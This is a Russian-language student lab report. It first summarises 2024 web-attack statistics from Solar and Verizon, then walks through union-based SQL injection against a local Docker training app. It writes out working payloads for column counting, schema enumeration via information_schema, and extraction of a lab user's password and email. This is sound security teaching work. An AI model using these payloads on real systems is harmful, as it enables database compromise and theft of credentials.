Отчет по лабораторной работе №1

Часть I. Исследовательский отчет по веб-уязвимостям

1. Введение

Целью данного раздела является статистический анализ актуальных угроз в области веб-безопасности за 2024–2025 годы. В отчете сравниваются данные глобального рынка и специфика кибератак на российские организации.

2. Ссылки на исследованные источники

Для подготовки отчета использовались данные ведущих экспертных центров:

  • ГК «Солар» (Solar MSS) — Отчет о веб-атаках на онлайн-ресурсы российских компаний в 2024 году. Аналитика построена на базе 1,8 млрд событий ИБ, зафиксированных сервисами WAF.
  • Verizon Business — 2024 Data Breach Investigations Report (DBIR). Глобальный анализ более 30 000 инцидентов и 10 000 подтвержденных утечек.
  • Newsletter Radensa — Обзор ключевых выводов Verizon DBIR 2024. Аналитический разбор влияния человеческого фактора и эксплуатации уязвимостей на бизнес.

3. Доля успешных атак через веб-уязвимости

Глобальная статистика (Verizon)

Согласно отчету Verizon DBIR 2024, прямая эксплуатация уязвимостей как способ первоначального проникновения в сеть выросла почти в 3 раза по сравнению с предыдущим периодом.

  • На текущий момент этот вектор составляет 14% всех подтвержденных утечек данных.
  • Растет сложность цепочек поставок: в 15% случаев взлом происходил через уязвимости в ПО сторонних производителей (Supply Chain Attack), что на 68% выше показателей 2023 года.

Российская статистика (Solar MSS)

В 2024 году в РФ зафиксирован беспрецедентный рост интенсивности атак:

  • Общее количество событий ИБ на уровне L7 выросло в 2,4 раза.
  • Злоумышленники максимально автоматизировали процесс: к концу 2024 года доля сканирований уязвимостей в общем объеме трафика достигла 77%.
  • Самыми атакуемыми отраслями стали B2C-сервисы: почтовые службы, ритейл и грузопассажирские перевозки. Для почтовых сервисов количество атак выросло кратно, достигая пиков в 46 млн событий на одну организацию в месяц.

4. Распределение по конкретным уязвимостям

На основе данных Solar MSS и Verizon, ландшафт уязвимостей распределяется следующим образом:

4.1. По частоте использования (массовость)

  1. Автоматизированные сканеры (77%): Поиск типовых ошибок конфигурации, открытых панелей администрирования и известных CVE.
  2. Сложные атаки высокого уровня (до 30%): Целевые попытки эксплуатации логики веб-приложения (инъекции, обход авторизации).
  3. Использование ботов (13%): Применяются для парсинга данных пользователей и массового перебора учетных данных (Credential Stuffing).

4.2. По критичности и методам реализации

  • SQL Injection (SQLi): Составляют около 6% от общей массы событий. Несмотря на небольшую долю в общем потоке, остаются критическим вектором, так как ведут к прямой компрометации баз данных.
  • Malformed Request Line (до 21%): Популярный метод в ИТ-отрасли. Заключается в формировании нестандартных HTTP-запросов для обхода сигнатурного анализа WAF.
  • Атаки на API и корпоративное ПО: Количество атак на API выросло в 4 раза. Доля атак на корпоративные системы (Jira, Confluence, OWA) выросла с 3% до 7%.
  • 0-day и скорость реагирования: Исследование Verizon показало, что злоумышленники начинают массово использовать новые уязвимости через 5 дней после их раскрытия, в то время как среднее время исправления (Patching) в компаниях составляет около 55 дней.

5. Выводы

Анализ подтверждает, что веб-уязвимости являются наиболее динамично растущим вектором атак. Если на мировом рынке превалирует эксплуатация критических брешей в корпоративном ПО (например, MOVEit), то в российском сегменте доминирует массовое автоматизированное сканирование и атаки на B2C-сектор с целью дестабилизации сервисов и хищения данных.

Часть II. Выполнение заданий по SQL-инъекциям

1. Подготовка и анализ среды

  • Запущено веб-приложение и база данных через Docker Desktop.
  • Приложение доступно по адресу http://localhost:8080/task/.
  • Первичная проверка на уязвимость с использованием одиночной кавычки (http://localhost:8080/task/?id=1') вызвала ошибку синтаксиса MySQL (You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1), что подтверждает наличие SQL-инъекции в параметре id.

2. Сбор информации о пользователях

Для выполнения заданий необходимо было сопоставить имена пользователей с их идентификаторами в базе данных. Был проведен ручной перебор параметров id в URL (http://localhost:8080/task/?id=4):

  • При id=1 был найден пользователь admin.
  • В ходе дальнейшего перебора (с 1 по 9) были успешно идентифицированы целевые пользователи:
    • ID 9: Пользователь Volk2.
    • ID 4: Пользователь Vinni-pukh.

3. Классическая эксплуатация: Метод Union-Based

После подтверждения уязвимости через ошибку в параметре id, было решено использовать оператор UNION для объединения легитимного запроса с вредоносным. Для успешного использования оператора UNION необходимо, чтобы количество столбцов в нашем запросе совпадало с количеством столбцов в оригинальном запросе приложения.

  • Определение количества столбцов: Используем конструкцию ORDER BY X. При превышении количества существующих столбцов база данных вернет ошибку.

    • ?id=1' order by 1-- - — Страница отображается корректно.
    • ?id=1' order by 2-- - — Страница отображается корректно.
    • ?id=1' order by 3-- - — Страница отображается корректно.
    • ?id=1' order by 4-- - — Ошибка: Unknown column '4' in 'order clause'.
    • Вывод: Исходный запрос выбирает 3 столбца.

  • Поиск точек вывода данных: Чтобы данные из нашего запроса отобразились на экране, нужно "отключить" вывод основной записи, задав несуществующий ID (например, -1).

    • Запрос: ?id=-1' union select 1,2,3-- -
    • Результат: На странице вместо данных пользователя отобразились цифры 1 и 2.
    • Вывод: Для вывода данных мы можем использовать первый и второй столбцы

4. Решение Задания №1: Поиск пароля Volk2

Цель: Получить пароль пользователя Volk2 (ID: 9) из таблицы users.

  • Формирование запроса: Поскольку нам доступны 1-я и 2-я позиции, поместим имя во вторую, а пароль в первую.
    • URL: http://localhost:8080/task/?id=-1' union select password,username,3 from users where id=9-- -
  • Результат на странице:
    • В первом поле вывода: Wa spoiuuuuu
    • Во втором поле вывода: Volk2

5. Решение Задания №2: Извлечение конфиденциальных данных (Почта Vinni-pukh)

Проблема: При анализе таблицы users было выявлено, что она содержит только три столбца: id, username и password. Поля для хранения адреса электронной почты в этой таблице нет. Это означает, что данные хранятся в другой таблице в рамках той же базы данных.

Шаг 1: Определение текущей базы данных

Для начала подтверждаем название текущей схемы (базы данных), чтобы знать, где искать другие таблицы.

  • Запрос: ?id=-1' union select database(),2,3-- -
  • Результат: security

Шаг 2: Поиск всех таблиц в базе данных security

Теперь обратимся к системной таблице information_schema.tables, чтобы увидеть список всех таблиц в нашей БД.

  • Запрос: ?id=-1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema='security'-- -
  • Результат: emails,users
  • Вывод: Обнаружена новая таблица emails.

Шаг 3: Анализ структуры таблицы emails

Выясняем названия колонок в найденной таблице, чтобы сформировать точный запрос.

  • Запрос: ?id=-1' union select group_concat(column_name),2,3 from information_schema.columns where table_name='emails' and table_schema='security'-- -
  • Результат: id,email_id
  • Вывод: Почта хранится в колонке email_id.

Шаг 4: Извлечение почты для Vinni-pukh (ID: 4)

Зная точное имя таблицы и колонки, сопоставляем их с ID нужного нам пользователя.

  • Запрос: http://localhost:8080/task/?id=-1' union select email_id,id,3 from emails where id=4-- -
  • Результат на странице:
    • Поле 1 (Email): honey_lover@otus-lab.com
    • Поле 2 (ID пользователя): 4
